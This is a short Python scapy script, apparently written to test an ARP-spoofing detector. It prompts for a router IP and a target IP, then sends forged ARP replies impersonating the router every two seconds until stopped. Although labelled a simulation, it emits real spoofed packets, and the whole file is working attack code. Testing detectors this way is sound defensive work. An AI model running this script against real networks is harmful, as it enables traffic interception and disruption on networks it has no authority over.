from scapy.all import *
import time
import subprocess
import platform

def get_manual_router_ip():
    """Ask user for router IP"""
    print("🔧 MANUAL ROUTER CONFIGURATION")
    print("=" * 40)
    
    router_ip = input("Enter your router IP (e.g., 192.168.1.1): ").strip()
    target_ip = input("Enter target device IP to spoof (e.g., 192.168.1.100): ").strip()
    
    return router_ip, target_ip

def simulate_arp_spoof():
    router_ip, target_ip = get_manual_router_ip()
    
    print("\n🚨 ARP Spoofing Attack Simulation")
    print("=" * 40)
    print(f"Router IP: {router_ip}")
    print(f"Target IP: {target_ip}")
    print("Attack starting in 3 seconds...")
    print("Press Ctrl+C to stop the attack")
    time.sleep(3)
    
    packet_count = 0
    try:
        while True:
            # Send spoofed ARP packet
            packet = ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff")
            send(packet, verbose=0)
            packet_count += 1
            print(f"📦 Sent spoofed ARP packet #{packet_count} - Pretending to be router {router_ip}", end='\r')
            time.sleep(2)  # Send every 2 seconds
            
    except KeyboardInterrupt:
        print(f"\n\n✅ Attack stopped. Total packets sent: {packet_count}")
        print("🔍 Check your web interface for detection alerts!")

if __name__ == "__main__":
    simulate_arp_spoof()